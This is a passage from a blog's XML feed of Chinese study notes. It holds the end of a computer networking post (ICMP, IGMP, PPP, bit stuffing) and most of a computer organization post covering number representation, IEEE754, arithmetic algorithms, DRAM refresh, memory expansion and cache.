src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630173941656.png" alt="image-20220630173941656"></p><h2 id="6、更新路由表"><a href="#6、更新路由表" class="headerlink" title="6、更新路由表"></a>6、更新路由表</h2><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630164443962.png" alt="image-20220630164443962"></p><h2 id="7、ICMP"><a href="#7、ICMP" class="headerlink" title="7、ICMP"></a>7、ICMP</h2><p>ICMP（Internet Control Message Protocol）Internet控制报文协议。它是TCP&#x2F;IP协议簇的一个子协议，用于<strong>在IP主机、路由器之间传递控制消息</strong>。控制消息是指<strong>网络通不通、主机是否可达、路由是否可用</strong>等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用</p><h2 id="8、IGMP"><a href="#8、IGMP" class="headerlink" title="8、IGMP"></a>8、IGMP</h2><p>主机IP软件需要进行组播扩展，才能使主机能够在本地网络上收发组播分组。但仅靠这一点是不够的，因为跨越多个网络的组播转发必须依赖于路由器。路由器为建立组播转发路由必需了解每个组员在Internet中的分布，这要求主机必须能将其所在的组播组通知给本地路由器，这也是建立组播转发路由的基础。主机与本地路由器之间使用Internet组管理协议（IGMP，Internet Group Management Protocol）来进行组播组成员信息的交互。IGMP是TCP&#x2F;IP中重要标准之一，所有IP组播系统（包括主机和路由器）都需要支持IGMP协议。</p><h2 id="9、PPP"><a href="#9、PPP" class="headerlink" title="9、PPP"></a>9、PPP</h2><p>点到点协议（Point to Point Protocol，PPP）是为在同等单元之间传输数据包这样的简单链路设计的链路层协议。这种链路提供全双工操作，并按照顺序传递数据包。设计目的主要是用来通过拨号或专线方式建立点对点连接发送数据，使其成为各种主机、网桥和路由器之间简单连接的一种共通的解决方案。PPP具有以下功能：<br>（1）PPP具有动态分配IP地址的能力，允许在连接时刻协商IP地址；<br>（2）PPP支持多种网络协议，比如TCP&#x2F;IP、NetBEUI、NWLINK等；<br>（3）PPP具有错误检测能力，但不具备纠错能力，所以ppp是不可靠传输协议；<br>（4）无重传的机制，网络开销小，速度快。<br>（5）PPP具有身份验证功能。<br>（6）PPP可以用于多种类型的物理介质上，包括串口线、电话线、移动电话和光纤（例如SDH），PPP也用于Internet接入。</p><p><img src="https://bkimg.cdn.bcebos.com/pic/5bafa40f4bfbfbed1643350578f0f736afc31fb5?x-bce-process=image/watermark,image_d2F0ZXIvYmFpa2U4MA==,g_7,xp_5,yp_5/format,f_auto" alt="img"></p><h2 id="10、位填充"><a href="#10、位填充" class="headerlink" title="10、位填充"></a>10、位填充</h2><p>当发送的数据链层在数据中遇到5个连续的1时，自动在其后插入一个0到输出比特流中，这叫位填充技术。当接收方看到5个连续的1后面跟着一个0时。自动将此0删除 。</p>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/2022/06/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
      <url>/2022/06/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机组成原理"><a href="#计算机组成原理" class="headerlink" title="计算机组成原理"></a>计算机组成原理</h1><h3 id="第一章-计算机系统概论"><a href="#第一章-计算机系统概论" class="headerlink" title="第一章  计算机系统概论"></a>第一章  计算机系统概论</h3><h4 id="1、非时间指标"><a href="#1、非时间指标" class="headerlink" title="1、非时间指标"></a>1、非时间指标</h4><h5 id="机器字长"><a href="#机器字长" class="headerlink" title="机器字长"></a>机器字长</h5><p><strong>定义：</strong>机器一次能处理的二进制位数</p><ul><li>由<strong>运算器、寄存器的位数</strong>决定；</li><li>一般<strong>与内部寄存器的位数相等</strong>；</li><li>字长决定数据表示范围与精度；</li><li>目前常见的有32位和64位字长。</li></ul><h5 id="总线宽度"><a href="#总线宽度" class="headerlink" title="总线宽度"></a>总线宽度</h5><p><strong>定义：</strong>数据总线一次能并行传送的最大信息位数</p><h5 id="主存容量与存储带宽"><a href="#主存容量与存储带宽" class="headerlink" title="主存容量与存储带宽"></a>主存容量与存储带宽</h5><p><strong>主存容量：</strong>是指一台计算机主存能存储的最大信息量。</p><p><strong>存储带宽：</strong> 指单位时间内与主存交换的二进制信息量，单位Byte&#x2F;s。   (影响存储带宽的指标包括数据位宽和数据传输速率)。</p><h4 id="2、时间指标"><a href="#2、时间指标" class="headerlink" title="2、时间指标"></a>2、时间指标</h4><h5 id="主频-f"><a href="#主频-f" class="headerlink" title="主频 f"></a>主频 f</h5><p>CPU工作的时钟频率，与CPU运算能力之间不是唯一的、直接关系；</p><h5 id="时钟周期T-x3D-1-x2F-f"><a href="#时钟周期T-x3D-1-x2F-f" class="headerlink" title="时钟周期T &#x3D; 1&#x2F;f"></a>时钟周期T &#x3D; 1&#x2F;f</h5><p>计算机中最基本的、最小的时间单位。一个时钟周期CPU仅完成一个最基本的动作；（也称为CPU周期）</p><h5 id="外频"><a href="#外频" class="headerlink" title="外频"></a>外频</h5><p>系统总线的工作频率，CPU与主板之间同步运行的速度，标准外频66MHz、100MHz、133MHz、200MHz、400MHz</p><h5 id="倍频"><a href="#倍频" class="headerlink" title="倍频"></a>倍频</h5><p>主频&#x3D;外频×倍频 ， Pentium 4 2.4G 主频  2400M &#x3D; 133M (外频) × 18 (倍频)</p><p>调整倍频可以获得较高的主频，486后出现的技术，使得外设低频，CPU高频</p><h4 id="x3D-x3D-3、CPI-x3D-x3D"><a href="#x3D-x3D-3、CPI-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;3、CPI&#x3D;&#x3D;"></a>&#x3D;&#x3D;3、CPI&#x3D;&#x3D;</h4><p>(Clock cycles Per Instruction)：执行一条指令 (平均) 需要的时钟周期数</p><p>CPI &#x3D; 一段程序中所有指令的时钟周期数之和 &#x2F; 指令条数        &#x2F;&#x2F;统计       </p><p>​      &#x3D; 程序中各类指令的CPI  ×  程序中该类指令的比例           &#x2F;&#x2F;加权</p><h4 id="x3D-x3D-4、MIPS-x3D-x3D"><a href="#x3D-x3D-4、MIPS-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;4、MIPS&#x3D;&#x3D;"></a>&#x3D;&#x3D;4、MIPS&#x3D;&#x3D;</h4><p> (Million Instructions  Per Second) ：表示每秒钟执行指令的条数  (以百万条为单位)</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220619172733798.png" alt="image-20220619172733798"></p><h4 id="5、CPU执行"><a href="#5、CPU执行" class="headerlink" title="5、CPU执行"></a>5、CPU执行</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220619173109951.png" alt="image-20220619173109951"></p><h3 id="第二章-计算机中的信息表示方式"><a href="#第二章-计算机中的信息表示方式" class="headerlink" title="第二章  计算机中的信息表示方式"></a>第二章  计算机中的信息表示方式</h3><h4 id="1、进制转换"><a href="#1、进制转换" class="headerlink" title="1、进制转换"></a>1、进制转换</h4><h5 id="①十进制→二进制"><a href="#①十进制→二进制" class="headerlink" title="①十进制→二进制"></a>①十进制→二进制</h5><p>整数部分:除2取余倒排,直到商为0 ;<br>小数部分:乘2取整顺排,直到小数位为0 ;  </p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220618151305155.png" alt="image-20220618151305155"></p><h5 id="②二进制转到八进制-从小数点向左右三位一组"><a href="#②二进制转到八进制-从小数点向左右三位一组" class="headerlink" title="②二进制转到八进制           从小数点向左右三位一组"></a>②二进制转到八进制           从小数点向左右三位一组</h5><p>   (10 011 100 . 01 )2<br>   (10 011 100 . 010)2 &#x3D; ( 234 . 2 )8                           </p><h5 id="③二进制转十六进制-从小数点向左右四位一组"><a href="#③二进制转十六进制-从小数点向左右四位一组" class="headerlink" title="③二进制转十六进制          从小数点向左右四位一组"></a>③二进制转十六进制          从小数点向左右四位一组</h5><p>   (1001 1100 . 01    )2<br>   (1001 1100 . 0100)2  &#x3D; ( 9C . 4 )16 </p><p>小数部分不足位数要补零凑足，否则出错</p><h4 id="2、原码"><a href="#2、原码" class="headerlink" title="2、原码"></a>2、原码</h4><p>最高位为符号位，0：正，1：负，数值位不变</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220618152045979.png" alt="image-20220618152045979"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220618152124964.png" alt="image-20220618152124964"></p><h4 id="3、补码"><a href="#3、补码" class="headerlink" title="3、补码"></a>3、补码</h4><p>真值为<strong>正数</strong>，补码等于原数据；真值为<strong>负数</strong>，增加一个模</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220618152616614.png" alt="image-20220618152616614"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220618152637062.png" alt="image-20220618152637062"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220618152720300.png" alt="image-20220618152720300"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220618152759338.png" alt="image-20220618152759338"></p><p>机器零唯一，负数比正数多一个</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220618152929721.png" alt="image-20220618152929721"></p><h4 id="4、移码"><a href="#4、移码" class="headerlink" title="4、移码"></a>4、移码</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220618153430682.png" alt="image-20220618153430682"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220618153518178.png" alt="image-20220618153518178"></p><h4 id="5、定点数的表示方法"><a href="#5、定点数的表示方法" class="headerlink" title="5、定点数的表示方法"></a>5、定点数的表示方法</h4><p><strong>定点表示：</strong>约定机器中所有数据的小数点位置是固定不变的。由于约定在固定的位置，小数点就不再使用记号“.”来表示。通常将数据表示成<strong>纯小数</strong>或<strong>纯整数</strong>。</p><p>C语言中的定点数</p><ul><li>无符号整数<ul><li>unsigned char 、unsigned short、unsigned  int </li><li>一般用于地址运算，编号表示，</li><li>指针是什么数据类型？</li></ul></li><li>有符号整数<ul><li>char、short、int、long</li><li>采用补码表示</li></ul></li><li>无符号整数最大值 &gt; 相同位数符号整数最大值<ul><li>8位无符号整数  最大是255（1111 1111）</li><li>8位有符号整数  最大为127（0111 1111）</li></ul></li></ul><h4 id="6、浮点数的表示方法"><a href="#6、浮点数的表示方法" class="headerlink" title="6、浮点数的表示方法"></a>6、浮点数的表示方法</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220618155738567.png" alt="image-20220618155738567"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220618160000566.png" alt="image-20220618160000566"></p><p> 由于基数在系统中是隐含约定的，不需要用代码表示，所以浮点数只需用一对定点数（阶码和尾数）表示，其中，数符表示数的正负，阶码表示小数点的位置，而尾数表示有效数字。</p><h5 id="x3D-x3D-规格化的浮点数-x3D-x3D"><a href="#x3D-x3D-规格化的浮点数-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;规格化的浮点数&#x3D;&#x3D;"></a>&#x3D;&#x3D;规格化的浮点数&#x3D;&#x3D;</h5><p>为了提高运算的精度，需要充分地利用尾数的有效数位，通常采取规格化的浮点数形式，即规定尾数M的<strong>最高数位</strong>必须是一个有效值<strong>（1）</strong>。如果尾数不是规格化数,要用<strong>修改阶码同时尾数移位</strong>的方法把他变为规格化数.</p><h5 id="x3D-x3D-IEEE754标准-x3D-x3D"><a href="#x3D-x3D-IEEE754标准-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;IEEE754标准&#x3D;&#x3D;"></a>&#x3D;&#x3D;IEEE754标准&#x3D;&#x3D;</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220618161025763.png" alt="image-20220618161025763"></p><ul><li><p><strong>注意：</strong></p><ul><li>阶码E采用移码表示，注意其<strong>偏移量是127</strong>而不是标准的128</li><li>尾数M为定点小数，小数点固定在M最左侧，且<strong>小数点左边还有一个隐藏的1</strong>，完整尾数形式为1.M</li></ul><p><strong>例题：</strong></p></li></ul><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image20220618161118.jpg" alt="image20220618161118"></p><h3 id="第三章-运算方法和运算部件"><a href="#第三章-运算方法和运算部件" class="headerlink" title="第三章  运算方法和运算部件"></a>第三章  运算方法和运算部件</h3><h4 id="1、补码加减法的实现"><a href="#1、补码加减法的实现" class="headerlink" title="1、补码加减法的实现"></a>1、补码加减法的实现</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620101139240.png" alt="image-20220620101139240"></p><h5 id="单符号溢出检测方法"><a href="#单符号溢出检测方法" class="headerlink" title="单符号溢出检测方法"></a>单符号溢出检测方法</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620101441295.png" alt="image-20220620101441295"></p><h5 id="双符号（变形补码）溢出检测方法"><a href="#双符号（变形补码）溢出检测方法" class="headerlink" title="双符号（变形补码）溢出检测方法"></a>双符号（变形补码）溢出检测方法</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620101500564.png" alt="image-20220620101500564"></p><p>“01”上溢，“10”下溢</p><h4 id="2、-x3D-x3D-定点乘法运算-x3D-x3D"><a href="#2、-x3D-x3D-定点乘法运算-x3D-x3D" class="headerlink" title="2、&#x3D;&#x3D;定点乘法运算&#x3D;&#x3D;"></a>2、&#x3D;&#x3D;定点乘法运算&#x3D;&#x3D;</h4><h5 id="无符号整数乘法运算"><a href="#无符号整数乘法运算" class="headerlink" title="无符号整数乘法运算"></a>无符号整数乘法运算</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620104342133.png" alt="image-20220620104342133"></p><h5 id="原码一位乘法运算"><a href="#原码一位乘法运算" class="headerlink" title="原码一位乘法运算"></a>原码一位乘法运算</h5><p><strong>运算规则：</strong></p><p>① 参加运算的操作数取其双符号数原码数值绝对值；<br>② 令乘数的最低位为判断位，若为“1”，加被乘数，若为“0”，不加被乘数（加0）；<br>③ 累加后的部分积右移一位；<br>④ 重复n次②和③；<br>⑤ 符号位单独处理，同号为正，异号为负。 </p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620104749913.png" alt="image-20220620104749913"></p><h5 id="定点补码一位乘法"><a href="#定点补码一位乘法" class="headerlink" title="定点补码一位乘法"></a>定点补码一位乘法</h5><p>Booth乘法规则如下：</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620105059472.png" alt="image-20220620105059472"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620110247278.png" alt="image-20220620110247278"></p><h4 id="3、定点除法运算"><a href="#3、定点除法运算" class="headerlink" title="3、定点除法运算"></a>3、定点除法运算</h4><h5 id="恢复余数除法"><a href="#恢复余数除法" class="headerlink" title="恢复余数除法"></a>恢复余数除法</h5><ul><li>如何判断是否够减<ul><li>利用补码作减法，<strong>判断余数符号</strong>即可</li></ul></li><li>余数为<strong>负数</strong>时，必须<strong>恢复余数</strong><ul><li>将余数加除数，恢复成<strong>原值</strong></li></ul></li><li>求<strong>下一位商</strong>，必须将余数<strong>左移一位</strong>，再与除数比较<ul><li>手工运算将除数右移？</li><li>注意这里余数放大了，<strong>最后结果要缩小</strong></li></ul></li><li>比较，上商（恢复），余数移位，再比较，<ul><li>直到商的位数足够</li></ul></li></ul><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620112119346.png" alt="image-20220620112119346"></p><h5 id="不恢复余数除法-加减交替法"><a href="#不恢复余数除法-加减交替法" class="headerlink" title="不恢复余数除法(加减交替法)"></a>不恢复余数除法(加减交替法)</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620112531002.png" alt="image-20220620112531002"></p><p><strong>注意：</strong> 在定点小数除法运算时，为了防止溢出，要求被除数的绝对值小于除数的绝对值，即|X|＜|Y|，且除数不能为0。另外，在原码加减交替法中，当最终余数为负数时，必须恢复一次余数，使之变为真余数，注意此时不需要再左移了。</p><h4 id="4、-x3D-x3D-浮点运算-x3D-x3D"><a href="#4、-x3D-x3D-浮点运算-x3D-x3D" class="headerlink" title="4、&#x3D;&#x3D;浮点运算&#x3D;&#x3D;"></a>4、&#x3D;&#x3D;浮点运算&#x3D;&#x3D;</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620122806.jpg" alt="image-20220620122806"></p><h5 id="结果规格化"><a href="#结果规格化" class="headerlink" title="结果规格化"></a>结果规格化</h5><p>结果规格化就是使运算结果成为规格化数。为了处理方便，可让尾数的符号位扩展为双符号位，当尾数运算结果不是11.0……或00.1……的形式时，应进行相应的规格化处理。</p><p>当尾数符号位为 <strong>01 或 10 时，运算结果上溢，需要向右规格化</strong>，且只需将尾数右移一位,同时将结果的阶码值加1。</p><p>当尾数运算结果为<strong>11.1……或00.0……时需要向左规格化</strong>，而且左移次数不固定，与运算结果的形式有关。向左规格化时尾数连同符号位一起左移，直到尾数部分出现11.0……或00.1……的形式为止。向左规格化时阶码做减法，左移多少位就减多少。</p><h5 id="舍入"><a href="#舍入" class="headerlink" title="舍入"></a>舍入</h5><p>在尾数进行向右规格化操作时，尾数末尾的几位会因超出计算机字长而被丢掉，从而产生误差。这时，计算机可以按选定的方式进行舍入操作。常用的舍入方法如下。</p><p><strong>末位恒置1法：</strong>只要因移位而丢失的位中有一位是1，就把运算结果的最低位置1，而不管最低位原来是0还是1。</p><p><strong>0舍1入法：</strong>当丢失位数的最高位是1 时将尾数的末位加1，类似于十进制数的四舍五入。注意舍入操作可能会破坏规格化结果，所以舍入操作后还需要再次进行规格化处理。</p><h5 id="溢出判断"><a href="#溢出判断" class="headerlink" title="溢出判断"></a>溢出判断</h5><p>由于浮点数中阶码的位数决定数的表示范围，因此对浮点运算而言，当阶码出现溢出时表示运算结果溢出，即当<strong>阶码的符号位为 01 和 10 时才表示运算结果溢出</strong>。</p><h3 id="第四章-存储系统"><a href="#第四章-存储系统" class="headerlink" title="第四章  存储系统"></a>第四章  存储系统</h3><h4 id="1、常用概念"><a href="#1、常用概念" class="headerlink" title="1、常用概念"></a>1、常用概念</h4><ol><li><strong>位</strong>是二进制数的最基本单位，也是存储器存储信息的最小单位。</li><li>一个二进制数由若干位组成，当这个二进制数作为一个整体存入或取出时，这个数称为<strong>存储字</strong>。</li><li>存放存储字或存储字节的主存空间称为<strong>存储单元或主存单元</strong>，大量存储单元的集合构成一个<strong>存储体</strong>，程序和数据都存放在存储体中，它是存储器的核心。</li><li><strong>小端存储</strong>：字地址等于<strong>最低</strong>有效字节地址</li><li><strong>大端存储</strong>：字地址等于<strong>最高</strong>有效字节地址</li></ol><h4 id="2、半导体存储器"><a href="#2、半导体存储器" class="headerlink" title="2、半导体存储器"></a>2、半导体存储器</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620153155081.png" alt="image-20220620153155081"></p><h5 id="随机存取存储器RAM"><a href="#随机存取存储器RAM" class="headerlink" title="随机存取存储器RAM"></a>随机存取存储器RAM</h5><p>​       CPU可以对RAM单元的内容随机地读写访问。CPU对任何一个存储单元的读写时间是一样的，即<strong>存取时间是相同的</strong>。</p><h6 id="SRAM"><a href="#SRAM" class="headerlink" title="SRAM"></a>SRAM</h6><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620153831160.png" alt="image-20220620153831160"></p><p>存储体（256×128×8）<br>通常把各个字的同一个字的同一位集成在一个芯片（32K×1）中，32K位排成256×128的矩阵。8个片子就可以构成32KB。</p><p>地址译码器<br>采用双译码的方式（减少选择线的数目）。<br>A0 ~ A7为行地址译码线<br>A8 ~ A14为列地址译码线</p><h6 id="DRAM"><a href="#DRAM" class="headerlink" title="DRAM"></a>DRAM</h6><p>动态存储器，是用<strong>金属氧化物半导体（MOS）</strong>的单个MOS管来存储一个二进制位（bit）信息的。信息被存储在MOS管T的源极的寄生电容CS中，例如，用CS中存储有电荷表示1，无电荷表示0。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620154351672.png" alt="image-20220620154351672"></p><h6 id="x3D-x3D-DRAM刷新-x3D-x3D"><a href="#x3D-x3D-DRAM刷新-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;DRAM刷新&#x3D;&#x3D;"></a>&#x3D;&#x3D;DRAM刷新&#x3D;&#x3D;</h6><p><strong>刷新：</strong>定期补充电荷以避免电荷泄露引起的信息丢失，电容存在泄露电流</p><p><strong>刷新周期:</strong>  存储器两次完整刷新之间的时间间隔<br>信息存储到泄漏之间必须完成刷新，称为最大刷新周期</p><p><strong>按行刷新</strong>：存储体采用双译码结构，刷新地址计数器给出刷新行地址</p><p><strong>刷新方式</strong>：集中式刷新、分散式刷新和异步式刷新</p><h6 id="集中刷新方式"><a href="#集中刷新方式" class="headerlink" title="集中刷新方式"></a>集中刷新方式</h6><p>刷新周期：2ms，在数据丢失之前集中刷新所有行。<strong>存在死区</strong>，用在实时要求不高的场合</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620155843710.png" alt="image-20220620155843710"></p><h6 id="分散刷新方式"><a href="#分散刷新方式" class="headerlink" title="分散刷新方式"></a>分散刷新方式</h6><p>刷新周期：2ms，读写+刷新   <strong>各刷新周期分散安排在存取周期中</strong><br>刷新次数  2ms&#x2F;100ns&#x3D;20000次   <strong>较浪费</strong>，用在低速系统中</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620155938197.png" alt="image-20220620155938197"></p><h6 id="异步刷新方式"><a href="#异步刷新方式" class="headerlink" title="异步刷新方式"></a>异步刷新方式</h6><p>刷新周期：2ms，各刷新周期分散安排在2ms内，每隔2ms&#x2F;128&#x3D;15.5微秒刷新一行,将128次刷新分散，<strong>最常用</strong></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620160041270.png" alt="image-20220620160041270"></p><h6 id="动态-RAM-和静态-RAM-的比较"><a href="#动态-RAM-和静态-RAM-的比较" class="headerlink" title="动态 RAM 和静态 RAM 的比较"></a>动态 RAM 和静态 RAM 的比较</h6><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620160209084.png" alt="image-20220620160209084"></p><h5 id="只读存储器ROM"><a href="#只读存储器ROM" class="headerlink" title="只读存储器ROM"></a>只读存储器ROM</h5><p>​      ROM可以看作RAM的一种特殊方式，存储器的内容<strong>只能随机读出而不能写入</strong>。即使停电，所存储的内容也不会丢失。</p><p>1、掩模式只读存储器（ROM）<br>      用二极管或晶体管作为元件，以元件的“有&#x2F;无”来表示存储单元的信息。该信息由芯片制造商在制造时写入内容，以后只能读，不能再次写入。<br>2、可编程只读存储器（PROM）<br>      一次性写入内容存储器，以熔丝的接通或断开来表示所存的信息为“1”或“0”，可由用户根据需要一次性写入内容，掉电后不会影响其存储内容<br>3、可擦可编程只读存储器（EPROM）<br>     用紫外线擦除写入内容，在高压作用下注入电子；可多次编程<br>4、可电擦可编程只读存储器（E²PROM）<br>     每个存储元采用两个晶体管，具有电擦除功能</p><h4 id="3、-x3D-x3D-存储器与CPU连接-x3D-x3D"><a href="#3、-x3D-x3D-存储器与CPU连接-x3D-x3D" class="headerlink" title="3、&#x3D;&#x3D;存储器与CPU连接&#x3D;&#x3D;"></a>3、&#x3D;&#x3D;存储器与CPU连接&#x3D;&#x3D;</h4><h5 id="位扩展法"><a href="#位扩展法" class="headerlink" title="位扩展法"></a>位扩展法</h5><p>只加大字长，而存储器的字数与存储器芯片字数一致,对片子没有选片要求</p><p>利用256K×1位的SRAM存储芯片组成256K×32位的存储器并于CPU连接</p><p>与 CPU 连接时，将 32 个存储芯片的地址线（18 根）、读写控制线各自并联，并分别与CPU 的地址线和读写控制线相连；同时将所有存储芯片的片选端均与CPU的MREQ#信号相连，只有这样才能保证 32 个芯片同时被选中；将 32 个存储芯片的数据线分别连到 CPU 的 32 位数据线上，具体连接如图 4.24 所示。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620163516652.png" alt="image-20220620163516652"></p><h5 id="字扩展法"><a href="#字扩展法" class="headerlink" title="字扩展法"></a>字扩展法</h5><p>仅在字向扩充，而位数不变.需由片选信号来区分各片地址。</p><p>利用256K×8位的SRAM存储芯片组成2M×8位的存储器并于CPU相连</p><p>与 CPU 进行连接时，256K 的芯片对应 18 根地址线，CPU 访问 2M 的主存容量需要 21根地址线；可以将高 3 位地址 A20-18送入 3:8 译码器输入端，将 3:8 译码器的 8 个输出分别连接到8个SRAM芯片的片选信号 CS 端；将 CPU 内存请求信号 MREQ#连接到译码器使能端，只有进行存储访问时，译码器才能进行工作，否则译码器输出全0（假设高电平有效），所有存储芯片均不被选中，输出为高阻态。存储器字扩展的具体连接如图所示。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620163313956.png" alt="image-20220620163313956"></p><h4 id="4、高速缓冲存储器cache"><a href="#4、高速缓冲存储器cache" class="headerlink" title="4、高速缓冲存储器cache"></a>4、高速缓冲存储器cache</h4><p><strong>用途</strong>：设置在 CPU 和 主存储器之间，完成高速与 CPU 交换信息，尽量避免 CPU不必要地多次直接访问速度要慢一些的主存储器，从而提高计算机系统的运行效率。</p><p><strong>实现</strong>：这是一个存储容量很小、但读写速度更快、以<strong>关联存储器方式</strong>运行、用<strong>静态存储器芯片(SRAM)实现的存储器。</strong></p><p><strong>要求</strong>：有足够高的命中率，既当 CPU需用主存中的数据时，多数情况可以直接从Cache中得到，称二者之比为<strong>命中率</strong>。</p><h5 id="①数据查找"><a href="#①数据查找" class="headerlink" title="①数据查找"></a>①数据查找</h5><h6 id="相联存储器"><a href="#相联存储器" class="headerlink" title="相联存储器"></a>相联存储器</h6><p>相联存储器（Content Addressable Memory，CAM）是一种<strong>按内容进行访问的存储器</strong>，用于存放查找表，其内部存储的基本数据单元是<strong>键值对</strong>（Key，Value）。CAM 的输入不是地址，而是<strong>检索关键字 key</strong>，输出则是该<strong>关键字对应的 value 值</strong>。相联存储器的基本原理如图所示。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620171412777.png" alt="image-20220620171412777"></p><p>图中包括 4 个键值对，每行都有一个键值对，其中一个有效位用于表示当前键值对是否有<br>效（为1时有效，为 0 时无效）；所有存储单元中的 key 字段同时与 CAM 输入的检索关键字进行并发比较，4 个存储单元共需要 4 个比较器，有效位为1 且比较结果相同则输出为 1。图中比较结果分别对应 L0～L3，这些比较结果将连接到对应三态门的控制端，当比较结果相符时，输出当前对应的 value 字段。L0～L3中只要有一个信号为 1 则表示查找成功，所以将L0～L3 进行逻辑或运算即可得到命中信号 hit。注意同—时刻L0～L3最多只能有一个信号为 1，否则会引起数据冲突。</p><h5 